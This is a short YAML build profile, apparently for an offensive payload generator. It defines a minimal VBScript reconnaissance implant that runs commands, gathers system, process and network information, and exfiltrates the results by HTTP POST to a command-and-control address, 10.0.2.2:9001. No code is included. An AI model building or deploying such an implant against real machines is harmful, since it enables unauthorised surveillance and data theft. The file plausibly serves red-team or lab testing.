name: vbs_recon_quick
description: Minimal VBScript recon - sysinfo, network, processes only
format: vbscript

core:
  - core/emit_buffer
  - core/run_cmd

collectors:
  - collectors/sysinfo
  - collectors/processes
  - collectors/network

exfil: exfil/http_post
arch: arch/sequential

evasion: []

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
